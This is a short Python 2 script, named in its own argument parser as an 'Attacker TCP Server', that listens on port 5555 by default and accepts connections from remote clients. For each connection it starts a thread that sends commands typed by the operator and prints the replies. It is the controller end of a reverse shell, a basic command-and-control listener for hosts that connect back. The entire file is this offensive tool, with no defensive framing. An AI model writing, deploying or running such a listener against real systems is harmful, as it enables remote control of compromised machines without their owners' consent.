import sys
import socket
import argparse
import threading

# to hold cliet server
clients = {}

def usage():
  print
  print "Examples:"
  print "python <script_name> -p 5555"
  exit(0)


def client_serve(client):
  try:
    print "Enter a command to execute and press CTRL+D:"
    input  = sys.stdin.read()
    client.send(input)

    while True:
      # wait for data from listener
      received_data = client.recv(4096)

      print received_data

      input = raw_input("")
      input += "\n"

      client.send(input)

  except:
    print "Client closed connection"
    pass


def server_listen(port_number):
  target_host = "0.0.0.0"

  listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  listener.bind((target_host,port_number))

  listener.listen(10)

  print "Server is listening on port: %d ..." % port_number

  while True:
    client,addr = listener.accept()
    print "Incoming connection from %s:%d" % (addr[0],addr[1])
    clients[addr[0]] = client
    client_serve_thread = threading.Thread(target=client_serve, args=(client,))
    client_serve_thread.start()

def main():
  parser = argparse.ArgumentParser('Attacker TCP Server')
  parser.add_argument("-p", "--port", type=int, help="The port to connect with", default=5555)

  args = parser.parse_args()

  #if args.port == None:
  #  usage()

  port_number = args.port

  server_listen(port_number)

if __name__ == "__main__":
  main()

